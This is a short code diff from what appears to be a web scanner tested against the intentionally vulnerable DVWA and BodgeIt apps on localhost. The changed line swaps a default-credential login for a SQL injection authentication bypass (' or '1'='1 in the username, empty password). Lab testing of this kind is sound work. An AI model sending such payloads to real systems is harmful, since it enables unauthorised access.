@@ -55,7 +55,7 @@ def authenticate(authTo, session):
     if (authTo == "dvwa"):
         session.post("http://127.0.0.1/dvwa/login.php", data = {"username" : "admin", "password" : "password", "Login" : "Login"})
     elif (authTo == "bodgeit"):
-        session.post("http://127.0.0.1:8080/bodgeit/login.jsp", data={'username': 'admin@thebodgeitstore.com', 'password': 'password'})
+        session.post("http://127.0.0.1:8080/bodgeit/login.jsp", data={'username': "admin@thebodgeitstore.com' or '1'='1", 'password': ''})
     
 """
 Returns all url inputs discovered
